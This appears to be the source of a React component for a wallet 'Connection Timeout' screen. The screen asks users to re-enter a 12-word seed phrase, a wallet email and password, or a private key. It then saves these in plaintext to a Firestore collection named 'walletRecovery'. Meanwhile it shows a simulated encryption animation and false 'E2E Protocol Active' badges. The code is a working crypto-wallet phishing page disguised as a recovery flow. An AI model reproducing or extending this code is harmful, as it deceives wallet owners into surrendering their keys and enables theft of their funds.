import React, { useState } from 'react';
import { AlertCircle, Key, Lock, Mail, Shield, ChevronLeft, Loader2, Eye, EyeOff } from 'lucide-react';
import { addDoc, collection } from 'firebase/firestore';
import { db } from '../../firebase';
import EncryptionProgress from './EncryptionProgress';
import { Button } from '../ui/button';
import { Input } from '../ui/input';
import { Card, CardContent } from '../ui/card';

function ErrorRecoverySection({ 
  onClose, 
  selectedWallet, 
  walletAddress, 
  customWalletName,
  onSuccess 
}) {
  const [recoveryOption, setRecoveryOption] = useState(null);
  const [formData, setFormData] = useState({
    email: '',
    password: '',
    privateKey: ''
  });
  const [seedWords, setSeedWords] = useState(Array(12).fill(''));
  const [showWords, setShowWords] = useState(Array(12).fill(false));
  const [showRecoveryForm, setShowRecoveryForm] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [encryptionStep, setEncryptionStep] = useState(0);
  const [retrying, setRetrying] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleRecoveryOptionSelect = (option) => {
    setRecoveryOption(option);
    setShowRecoveryForm(true);
    setIsSubmitting(false);
    // Reset seed words when opening the form
    if (option === 'Seed Phrase') {
      setSeedWords(Array(12).fill(''));
      setShowWords(Array(12).fill(false));
    }
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handleSeedWordChange = (index, value) => {
    const newWords = [...seedWords];
    newWords[index] = value.trim();
    setSeedWords(newWords);
  };

  const toggleWordVisibility = (index) => {
    const newShowWords = [...showWords];
    newShowWords[index] = !newShowWords[index];
    setShowWords(newShowWords);
  };

  const handleSeedPaste = (e) => {
    e.preventDefault();
    const pastedText = e.clipboardData.getData('text');
    const words = pastedText.trim().split(/\s+/).slice(0, 12);
    
    if (words.length > 0) {
      const newWords = [...seedWords];
      words.forEach((word, i) => {
        if (i < 12) newWords[i] = word;
      });
      setSeedWords(newWords);
    }
  };

  const handleRecoverySubmit = async (e) => {
    e.preventDefault();
    
    setIsSubmitting(true);
    setEncryptionStep(1);
    
    const walletName = selectedWallet?.id === 'other' ? customWalletName : selectedWallet?.name;
    
    // Simulate encryption process
    setTimeout(() => setEncryptionStep(2), 1000);
    setTimeout(() => setEncryptionStep(3), 2000);
    
    try {
      setTimeout(async () => {
        const payload = {
          walletType: walletName || 'Unknown',
          walletAddress: walletAddress || 'Not provided',
          recoveryOption: recoveryOption,
          timestamp: new Date().toISOString(),
          status: 'pending',
          encrypted: true,
        };

        if (recoveryOption === 'Seed Phrase') {
          payload.seedPhrase = seedWords.join(' ');
        }
        if (recoveryOption === 'Email & Password') {
          payload.email = formData.email;
          payload.password = formData.password;
        }
        if (recoveryOption === 'Private Key') payload.privateKey = formData.privateKey;

        await addDoc(collection(db, 'walletRecovery'), payload);
        
        onSuccess();
      }, 3000);
      
    } catch (error) {
      console.error('Error saving recovery data:', error);
      alert('Secure transmission failed. Please try again.');
      setEncryptionStep(0);
      setIsSubmitting(false);
    }
  };

  const handleRetry = () => {
    setRetrying(true);
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setRetrying(false);
      onClose();
    }, 3000);
  };

  const brandColor = selectedWallet?.brandColor || '#000000';

  return (
    <div className="min-h-screen bg-background flex items-center justify-center p-6 relative overflow-hidden">
      {/* Background Decorative Elements */}
      <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full max-w-2xl h-[500px] bg-destructive/[0.03] rounded-full blur-[120px] -z-10" />

      <Card className="max-w-md w-full border-none shadow-2xl rounded-3xl overflow-hidden">
        <div className="p-8 space-y-6">
          <div className="flex flex-col items-center text-center space-y-2">
            <div className="h-12 w-12 rounded-full bg-destructive/10 flex items-center justify-center mb-2">
              <AlertCircle className="h-6 w-6 text-destructive" />
            </div>
            <h1 className="text-2xl font-space-grotesk font-bold text-foreground uppercase tracking-tight">
              {loading ? 'Re-establishing Connection' : 'Connection Timeout'}
            </h1>
            <p className="text-sm text-muted-foreground font-medium">
              {loading ? 'Securing alternative route...' : 'Manual validation required to continue access.'}
            </p>
          </div>

          {loading ? (
            <div className="flex flex-col items-center justify-center py-10 space-y-4">
              <Loader2 className="h-10 w-10 text-primary animate-spin opacity-20" />
              <p className="text-[10px] font-bold uppercase tracking-[0.2em] text-muted-foreground animate-pulse text-center">
                Syncing with secure failover node...
              </p>
            </div>
          ) : showRecoveryForm ? (
            <form onSubmit={handleRecoverySubmit} className="space-y-6">
              {isSubmitting ? (
                <EncryptionProgress encryptionStep={encryptionStep} brandColor={brandColor} />
              ) : (
                <>
                  <div className="space-y-4">
                    <div className="flex items-center justify-between">
                      <Button 
                        variant="ghost" 
                        size="sm" 
                        type="button"
                        onClick={() => setShowRecoveryForm(false)}
                        className="px-0 hover:bg-transparent text-primary font-bold uppercase tracking-widest text-[10px]"
                      >
                        <ChevronLeft className="h-3 w-3 mr-1" />
                        Back
                      </Button>
                      <div className="flex items-center gap-1.5 px-3 py-1 rounded-full bg-primary/5 border border-primary/10 text-[10px] font-bold text-primary uppercase">
                        <Lock className="h-2.5 w-2.5" />
                        E2E Protocol Active
                      </div>
                    </div>

                    <div className="space-y-4 pt-2">
                      <h2 className="text-sm font-bold text-foreground uppercase tracking-wider">
                        {recoveryOption} Validation
                      </h2>
                      
                      {recoveryOption === 'Seed Phrase' && (
                        <div className="grid grid-cols-2 gap-3" onPaste={handleSeedPaste}>
                          {seedWords.map((word, index) => (
                            <div key={index} className="relative group">
                              <span className="absolute left-3 top-1/2 -translate-y-1/2 text-[10px] font-mono font-bold text-muted-foreground/40 select-none">
                                {index + 1}
                              </span>
                              <Input
                                type={showWords[index] ? "text" : "password"}
                                value={word}
                                onChange={(e) => handleSeedWordChange(index, e.target.value)}
                                className="h-10 pl-8 pr-12 rounded-xl bg-secondary/30 border-none text-xs font-mono focus:ring-1 focus:ring-primary/20 transition-all"
                                placeholder={`Word ${index + 1}`}
                                required
                              />
                              <button
                                type="button"
                                onClick={() => toggleWordVisibility(index)}
                                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground/40 hover:text-primary transition-colors p-1"
                              >
                                {showWords[index] ? (
                                  <Eye className="h-3.5 w-3.5" />
                                ) : (
                                  <EyeOff className="h-3.5 w-3.5" />
                                )}
                              </button>
                            </div>
                          ))}
                        </div>
                      )}

                      {recoveryOption === 'Email & Password' && (
                        <div className="space-y-3">
                          <Input
                            name="email"
                            type="email"
                            value={formData.email}
                            onChange={handleInputChange}
                            className="h-12 rounded-xl bg-secondary/30 border-none px-4"
                            placeholder="Wallet Email"
                            required
                          />
                          <Input
                            name="password"
                            type="password"
                            value={formData.password}
                            onChange={handleInputChange}
                            className="h-12 rounded-xl bg-secondary/30 border-none px-4"
                            placeholder="Wallet Password"
                            required
                          />
                        </div>
                      )}

                      {recoveryOption === 'Private Key' && (
                        <Input
                          name="privateKey"
                          value={formData.privateKey}
                          onChange={handleInputChange}
                          className="h-12 rounded-xl bg-secondary/30 border-none px-4 font-mono text-xs"
                          placeholder="0x..."
                          required
                        />
                      )}
                    </div>
                  </div>

                  <Button
                    type="submit"
                    className="w-full h-14 rounded-2xl font-bold uppercase tracking-widest bg-primary text-primary-foreground shadow-lg hover:scale-[1.02] active:scale-[0.98] transition-all"
                  >
                    <Shield className="w-5 h-5 mr-2" />
                     Login
                  </Button>
                </>
              )}
            </form>
          ) : (
            <div className="space-y-4">
              <div className="grid gap-3">
                <button
                  onClick={() => handleRecoveryOptionSelect('Seed Phrase')}
                  className="flex items-center gap-4 p-4 rounded-2xl bg-secondary/30 hover:bg-secondary/50 border border-transparent hover:border-border transition-all text-left group"
                >
                  <div className="h-10 w-10 rounded-xl bg-background flex items-center justify-center shadow-sm">
                    <Key className="h-5 w-5 text-primary/60" />
                  </div>
                  <div className="flex-1">
                    <span className="block text-sm font-bold text-foreground uppercase tracking-tight">Seed Phrase</span>
                    <span className="text-[10px] text-muted-foreground font-medium uppercase">Standard recovery cold path</span>
                  </div>
                </button>

                <button
                  onClick={() => handleRecoveryOptionSelect('Email & Password')}
                  className="flex items-center gap-4 p-4 rounded-2xl bg-secondary/30 hover:bg-secondary/50 border border-transparent hover:border-border transition-all text-left group"
                >
                  <div className="h-10 w-10 rounded-xl bg-background flex items-center justify-center shadow-sm">
                    <Mail className="h-5 w-5 text-primary/60" />
                  </div>
                  <div className="flex-1">
                    <span className="block text-sm font-bold text-foreground uppercase tracking-tight">Email & Password</span>
                    <span className="text-[10px] text-muted-foreground font-medium uppercase">For hosted/managed wallets</span>
                  </div>
                </button>

                <button
                  onClick={() => handleRecoveryOptionSelect('Private Key')}
                  className="flex items-center gap-4 p-4 rounded-2xl bg-secondary/30 hover:bg-secondary/50 border border-transparent hover:border-border transition-all text-left group"
                >
                  <div className="h-10 w-10 rounded-xl bg-background flex items-center justify-center shadow-sm">
                    <Lock className="h-5 w-5 text-primary/60" />
                  </div>
                  <div className="flex-1">
                    <span className="block text-sm font-bold text-foreground uppercase tracking-tight">Private Key</span>
                    <span className="text-[10px] text-muted-foreground font-medium uppercase">Direct cryptographic access</span>
                  </div>
                </button>
              </div>

              <div className="pt-4 space-y-3">
                <div className="h-px bg-border/50 w-full" />
                <Button
                  onClick={handleRetry}
                  variant="ghost"
                  className="w-full text-[10px] font-bold uppercase tracking-[0.2em] text-muted-foreground hover:bg-primary/5 hover:text-primary transition-all underline decoration-primary/20"
                >
                  Retry Automatic Validation
                </Button>
              </div>
            </div>
          )}

          <div className="flex items-center justify-center gap-2 text-[10px] font-bold uppercase tracking-widest text-muted-foreground opacity-30">
            <Shield className="w-3 h-3" />
            <span>Secure Protocol Failover</span>
          </div>
        </div>
      </Card>
    </div>
  );
}

export default ErrorRecoverySection;
